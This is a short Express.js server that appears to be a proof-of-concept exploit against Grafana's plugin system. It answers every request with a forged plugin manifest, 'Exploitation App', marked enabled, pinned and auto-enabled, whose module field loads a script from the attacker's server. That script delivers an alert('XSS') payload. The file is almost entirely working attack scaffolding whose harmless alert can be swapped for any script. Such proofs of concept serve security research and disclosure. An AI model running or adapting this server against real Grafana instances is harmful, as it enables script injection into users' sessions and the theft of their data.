import express from "express";

const app = express();

let json = {
    "name": "Exploitation App",
    "type": "app",
    "id": "exploit-app",
    "enabled": true,
    "pinned": true,
    "autoEnabled": true,
    "module": "http://localhost:1337/module.js", //js file to load
    "baseUrl": "public/plugins/exploit-app",
    "info": {
        "author": {
            "name": "Grafana",
            "url": "http://example.com"
        }
    }
};

app.get("/module.js", (req, res) => {
    return res.status(200).type("application/javascript").send(`alert("XSS");`);
});

app.use(/(.*)/, (req, res) => {
    return res.status(200).json(json);
});

app.listen(1337, '0.0.0.0');